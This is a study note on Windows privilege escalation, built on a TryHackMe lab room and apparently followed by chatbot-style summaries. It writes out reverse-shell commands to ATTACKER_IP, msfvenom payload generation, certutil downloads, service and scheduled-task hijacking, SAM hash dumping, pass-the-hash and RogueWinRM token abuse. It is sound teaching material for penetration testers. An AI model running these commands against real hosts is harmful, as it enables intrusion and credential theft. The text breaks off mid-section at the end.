# Introduction 
During a penetration test, you will often have access to some Windows hosts with an unprivileged user. Unprivileged users will hold limited access, including their files and folders only, and have no means to perform administrative tasks on the host, preventing you from having complete control over your target.

This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.

 If you want to brush up on your skills first, you can have a look through the [Windows Fundamentals Module](https://tryhackme.com/module/windows-fundamentals) or the [Hacking Windows Module](https://tryhackme.com/module/hacking-windows-1).

# Windows privilege escalation
Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

Before jumping into the actual techniques, let's look at the different account types on a Windows system.

  

## Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

|**Administrators**|These users have the most privileges. They can change any system configuration parameter and access any file in the system.|
|**Standard Users**|These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.|

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

|   |   |
|---|---|
|**SYSTEM / LocalSystem**|An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.|
|**Local Service**|Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.|
|**Network Service**|Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.|

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

# Harvesting password from useful spots 
The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

This task will present some known places to look for passwords on a Windows system.

Before going into the task, remember to click the **Start Machine** button. You will be using the same machine throughout tasks 3 to 5. If you are using the **AttackBox**, this is also a good moment to start it as you'll be needing it for the following tasks.

In case you prefer connecting to the target machine via RDP, you can use the following credentials:

**User:** `thm-unpriv`

**Password:** `Password321`

## Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

  

## Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:

```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. 

  

## Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```shell-session
runas /savecred /user:admin cmd.exe
```

  

## IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

  

## Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

#rdp_connection from linux command:
`xfreerdp /v:TARGET_IP /u:thm-unpriv /p:Password321 +clipboard`

# Other Quick Wins
Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

  

## Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

Command Prompt

```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:

Command Prompt

```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

Command Prompt

```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

```shell-session
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:

Command Prompt

```shell-session
C:\> schtasks /run /tn vulntask
```

And you will receive the reverse shell with taskusr1 privileges as expected:

KaliLinux

```shell-session
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

  

## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

**Note:** The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.

Command Prompt

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

Command Prompt

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```


# Abusing Service Misconfigurations
Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

Command Prompt

```shell-session
C:\> sc qc apphostsvc
```

Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:

A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.

## Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using `sc`:

Command Prompt

```shell-session
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS
```

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:

Command Prompt

```shell-session
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

KaliLinux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
```

We can then pull the payload from Powershell with the following command:

Powershell

```shell-session
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

Command Prompt

```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

We start a reverse listener on our attacker machine:

KaliLinux

```shell-session
user@attackerpc$ nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:

Command Prompt

```shell-session
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

**Note:** PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

KaliLinux

```shell-session
user@attackerpc$ nc -lvp 4445
```

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

  

## Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, followed by the given parameters:

Command Prompt

```shell-session
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS
```

**Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.**  
Now let's look at another service without proper quotation:

Command Prompt

```shell-session
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS
```

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

|Command|Argument 1|Argument 2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||

  

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under `c:\MyPrograms`. By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it. We can check this using `icacls`:

Command Prompt

```shell-session
C:\>icacls c:\MyPrograms
```

The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:

KaliLinux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446
```

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:

Command Prompt

```shell-session
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Once the service gets restarted, your payload should execute:

Command Prompt

```shell-session
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

As a result, you'll get a reverse shell with svcusr2 privileges:

KaliLinux

```shell-session
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

  

## Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:

Command Prompt

```shell-session
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

KaliLinux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```

We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:

Command Prompt

```shell-session
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):

Command Prompt

```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:

Command Prompt

```shell-session
C:\> sc stop THMService
C:\> sc start THMService
```

And we will receive a shell back in our attacker's machine with SYSTEM privileges:

KaliLinux

```shell-session
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

Go to the Administrator's desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

#summerys
# 🚩 **Windows Service Privilege Escalation: 3 Easy Paths to Flags**

> **Goal**: Turn a low-privilege user (`thm-unpriv`) into a higher-privileged user (`svcusr1`, `svcusr2`, or even `SYSTEM`) by abusing misconfigured Windows services.

---

## 🔑 **Before You Start: Essential Tools & Concepts**

- **`sc`** = Service Control (use `sc.exe` in PowerShell!)
- **`icacls`** = Check/modify file permissions
- **`accesschk64.exe`** = Check service permissions (from Sysinternals)
- **`msfvenom`** = Generate reverse shell payloads
- **Flags are on user desktops**:  
    `C:\Users\<username>\Desktop\flag.txt`

---

## 🛠️ **Path 1: Insecure Service Executable Permissions**

> _"I can overwrite the service’s .exe!"_

### ✅ When to Use:

- You find a service whose **.exe file is writable by you** (e.g., `Everyone:(M)`).

### 🔍 How to Find It:

cmd

1 `sc qc windowsscheduler`

2 `icacls "C:\PROGRA~2\SYSTEM~1\WService.exe"`

→ Look for **`(M)` = Modify** or **`(F)` = Full** for `Everyone` or `Users`.

### 🧨 Exploit Steps:

1. **Generate payload** (on Kali):
    
    bash
    
    1 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4445 -f exe-service -o rev.exe`
    
    2 `python3 -m http.server 8000`
    
    
2. **Download payload** (on Windows, in CMD):
    
    cmd
    
    1 `certutil -urlcache -f http://YOUR_IP:8000/rev.exe rev.exe`
    
    
    
3. **Replace the service executable**:
    
    cmd
    
    1 `move "C:\PROGRA~2\SYSTEM~1\WService.exe" "WService.exe.bkp"`
    
    2 `move rev.exe "C:\PROGRA~2\SYSTEM~1\WService.exe"`
    
    3 `icacls "C:\PROGRA~2\SYSTEM~1\WService.exe" /grant Everyone:F`
    

4. **Restart service**:
    
    cmd
    
    1 `sc stop windowsscheduler`
    
    2 `sc start windowsscheduler`
    

5. **Catch shell** (on Kali):
    
    bash
    
    1 `nc -lvp 4445`
    
    → You’ll get a shell as **`svcusr1`** → grab flag from their desktop.

---

## 🛠️ **Path 2: Unquoted Service Path**

> _"The service path has spaces but no quotes!"_

### ✅ When to Use:

- Service `BINARY_PATH_NAME` has **spaces** and **NO quotes**, e.g.:  
    `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`

### 🔍 How to Find It:

cmd

1 `sc qc "disk sorter enterprise"`

→ If path has spaces and **no `"` around it** → vulnerable!

### 🧨 Exploit Steps:

1. **Check if you can write to the parent folder**:
    
    cmd
    
    1 `icacls C:\MyPrograms`
    
    → Look for **`WD` (Write)** or **`AD` (Create files/folders)** for `Users`.
    
2. **Identify the first hijackable name**:  
    From `C:\MyPrograms\Disk Sorter Enterprise\...` → try **`C:\MyPrograms\Disk.exe`**
    
3. **Upload payload as that name**:
    
    cmd
    
    1 `certutil -urlcache -f http://YOUR_IP:8000/rev2.exe C:\MyPrograms\Disk.exe`
    
    2 `icacls C:\MyPrograms\Disk.exe /grant Everyone:F`
    
4. **Restart service**:
    
    cmd
    
    1 `sc stop "disk sorter enterprise"`
    
    2 `sc start "disk sorter enterprise"`
    
5. **Catch shell** (on Kali, port 4446):
    
    bash
    
    1 `nc -lvp 4446`
    
    → Shell as **`svcusr2`** → grab their flag.
    

---

## 🛠️ **Path 3: Insecure Service DACL (Reconfigure Service)**

> _"I can change what the service runs!"_

### ✅ When to Use:

- You have **`SERVICE_ALL_ACCESS`** on a service (via `accesschk`).

### 🔍 How to Find It:

cmd

1 `C:\tools\accesschk64.exe -qlc THMService`

→ If you see:  
`BUILTIN\Users: SERVICE_ALL_ACCESS` → **you can reconfigure it!**

### 🧨 Exploit Steps:

1. **Generate payload** (port 4447):
    
    bash
    
    1 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4447 -f exe-service -o rev3.exe`
    
    
2. **Upload & grant permissions**:
    
    cmd
    
    1 `certutil -urlcache -f http://YOUR_IP:8000/rev3.exe C:\Users\thm-unpriv\rev3.exe`
    
    2 `icacls C:\Users\thm-unpriv\rev3.exe /grant Everyone:F`
    
3. **Reconfigure service to run your payload as SYSTEM**:
    
    cmd
    
    1 `sc config THMService binPath= "C:\Users\thm-unpriv\rev3.exe" obj= LocalSystem`
    
1. **Restart service**:
    
    cmd
    
    1 `sc stop THMService`
    
    2 `sc start THMService`
    
1. **Catch shell** (on Kali):
    
    bash
    
    1 `nc -lvp 4447`
    
    → Shell as **`NT AUTHORITY\SYSTEM`** → grab flag from **`C:\Users\Administrator\Desktop\flag.txt`**
    

---

## 🧭 **Your Quick Decision Flowchart**

1. **List services**:  
    `sc query state= all`
    
2. **For each interesting service** (non-LocalSystem, custom path):
    
    - ✅ **Check executable permissions**: `icacls "path.exe"`  
        → If writable → **Path 1**
    - ✅ **Check if path is unquoted + has spaces**: `sc qc name`  
        → If yes + you can write to parent folder → **Path 2**
    - ✅ **Check service DACL**: `accesschk64.exe -qlc name`  
        → If `SERVICE_ALL_ACCESS` for Users → **Path 3**
3. **Exploit → Get shell → Grab flag!**
    

---

## 💡 Pro Tips for Success

- Always use **`certutil`** in CMD to download files (not `wget`).
- Use **`sc.exe`** in PowerShell (not `sc`).
- **Port 8000** = web server (for downloading), **4445/4446/4447** = reverse shells.
- After getting a shell, run:
    
    cmd
    
    1 `whoami`
    
    2 `type C:\Users\<user>\Desktop\flag.txt`

---

## 🏁 Final Thought

These 3 techniques cover **90% of Windows service-based privilege escalations** in CTFs and real pentests.  
**Remember the order**:

1. Can I **overwrite** the .exe?
2. Is the path **unquoted**?
3. Can I **reconfigure** the service?

Master this flow, and you’ll **always find the flag**! 🚩

Good luck — you've got this! 💪


# Abusing Dangerous Privileges 
## 🔐 **What Are Privileges in Windows?**

- **Privileges** = Special rights granted to user accounts to perform **system-level tasks** beyond normal file/registry access.
- Unlike group memberships (e.g., "Users", "Administrators"), privileges are **fine-grained capabilities** (e.g., "shut down system", "back up files").
- View your privileges:
    
    cmd
    
    1 `whoami /priv`

> ⚠️ **Key Insight**: Some privileges—though not full admin—can be **abused to gain SYSTEM or Administrator access**.

---

## 🎯 Top 3 Exploitable Privileges (and How to Abuse Them)

---

### 1️⃣ **SeBackup + SeRestore** → Steal SAM & SYSTEM Hives

#### 💡 **What it does**:

- Bypass **DACLs (Access Control Lists)** to **read/write ANY file**, even protected system files.
- Meant for backup operators—but dangerous in attacker hands.

#### 🔧 **Exploitation Steps**:

1. **Log in** as user with these privileges (e.g., `THMBackup` in Backup Operators group).
2. **Open CMD as admin** (UAC prompt → enter password).
3. **Save SAM & SYSTEM registry hives**:
    
    cmd
    
    1 `reg save hklm\sam C:\sam.hive`
    
    2 `reg save hklm\system C:\system.hive`
    
1. **Exfiltrate files** to your attacker machine:
    - Use `copy` over SMB (e.g., via `impacket-smbserver`).
2. **Dump hashes**:
    
    bash
    
    1 `secretsdump.py -sam sam.hive -system system.hive LOCAL`
    
1. **Pass-the-Hash** to get SYSTEM:
    
    bash
    
    1 `psexec.py -hashes LMHASH:NTHASH administrator@TARGET_IP`
    

✅ **Result**: Full SYSTEM shell.

> 📌 **Defense Tip**: Never grant `SeBackup`/`SeRestore` to non-admin users. Monitor `reg save` usage.

---

### 2️⃣ **SeTakeOwnership** → Hijack System Binaries

#### 💡 **What it does**:

- Take **ownership** of any file/registry key—even if you have no permissions.
- Once owner, you can **grant yourself full control**.

#### 🔧 **Exploitation Steps** (Utilman.exe trick):

1. **Log in** as user with `SeTakeOwnership` (e.g., `THMTakeOwnership`).
2. **Open CMD as admin**.
3. **Take ownership of `utilman.exe`** (runs as SYSTEM on lock screen):
    
    cmd
    
    1 `takeown /f C:\Windows\System32\Utilman.exe`
    
4. **Grant yourself full permissions**:
    
    cmd
    
    1 `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
    
1. **Replace `utilman.exe` with `cmd.exe`**:
    
    cmd
    
    1 `copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`
    
1. **Lock screen** → Click **Ease of Access** → **SYSTEM shell pops up!**

✅ **Result**: Interactive SYSTEM command prompt.

> 📌 **Defense Tip**: Restrict `SeTakeOwnership`. Monitor writes to `System32`.

---

### 3️⃣ **SeImpersonate / SeAssignPrimaryToken** → Token Impersonation

#### 💡 **What it does**:

- Impersonate other users **after they authenticate** to your process.
- Common in **service accounts** (e.g., IIS AppPool, NETWORK SERVICE).

#### 🔧 **Exploitation Steps** (RogueWinRM + BITS):

1. **Compromise a service** with these privileges (e.g., IIS web shell).
    
2. **Start a fake WinRM server** on port `5985` using **RogueWinRM**.
    
3. **Trigger BITS service** (it auto-connects to WinRM as **SYSTEM**).
    
4. **Catch the SYSTEM token** and impersonate it.
    
5. **Execute payload** (e.g., reverse shell):
    
    On attacker:
    
    bash
    
    1 `nc -lvnp 4442`
    
    
    
    On target (via web shell):
    
    cmd
    
    1 `C:\tools\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe YOUR_IP 4442"`
    

✅ **Result**: Reverse shell as **NT AUTHORITY\SYSTEM**.

> 📌 **Why it works**: BITS service connects to WinRM as SYSTEM → your fake server captures & impersonates that token.

> 📌 **Defense Tip**: Disable WinRM if unused. Restrict impersonation privileges. Monitor unusual service starts.

---

## 🛠️ Tools You Need (Kali Linux)

|||
|---|---|
|`impacket-smbserver.py`|Host SMB share to exfiltrate files|
|`secretsdump.py`|Extract hashes from SAM/SYSTEM|
|`psexec.py`|Pass-the-Hash remote execution|
|`RogueWinRM.exe`|Abuse SeImpersonate via fake WinRM|
|`nc64.exe`|Windows netcat for reverse shells|

> 💡 All Impacket tools: `/opt/impacket/examples/`

---

## 📚 Learning Checklist (For Labs/CTFs)

✅ Understand what each privilege allows  
✅ Practice `whoami /priv` on different accounts  
✅ Learn `takeown` + `icacls` for file ownership abuse  
✅ Master registry hive dumping (`reg save`)  
✅ Set up SMB shares with Impacket  
✅ Use `secretsdump.py` offline  
✅ Try the **Utilman.exe** trick in a VM  
✅ Run **RogueWinRM** in a controlled environment  
✅ Always **lock screen** to test Utilman replacement  
✅ Know how **Pass-the-Hash** works

---

## 🛡️ Mitigation & Blue Team Perspective

- **Principle of Least Privilege**: Never assign high-risk privileges unnecessarily.
- **Audit privileges**: Regularly check `whoami /priv` across service accounts.
- **Monitor suspicious activity**:
    - `reg save` on SAM/SYSTEM
    - Modifications to `System32` binaries
    - Unexpected WinRM or BITS service starts
- **Enable LSA Protection** and **Credential Guard** to protect hashes.
- **Restrict impersonation** via Group Policy if not needed.

---

## 🔚 Final Tip for CTFs/Labs

> When you get a low-priv shell:
> 
> 1. Run `whoami /priv`
> 2. Check for **SeBackup**, **SeTakeOwnership**, or **SeImpersonate**
> 3. Pick the matching exploit path above
> 4. Get SYSTEM → Read `C:\Users\Administrator\Desktop\flag.txt`

You’ve got this! 🏁

Let me know if you want a **cheat sheet PDF** or **practice VM setup guide**!

# Abusing dangerous privileges
### 🔐 **Privilege Escalation Summary – Key Concepts & Techniques**

Windows **privileges** (also called _user rights_) allow accounts to perform system-level actions beyond standard file/registry permissions (DACLs). While many exist, attackers focus on **abusable privileges** that enable **privilege escalation to SYSTEM or Administrator**.

---

## 🔹 1. **SeBackupPrivilege + SeRestorePrivilege**

- **What it does**: Bypass file/registry DACLs to **read/write any file**, including sensitive system files.
- **Abuse**:
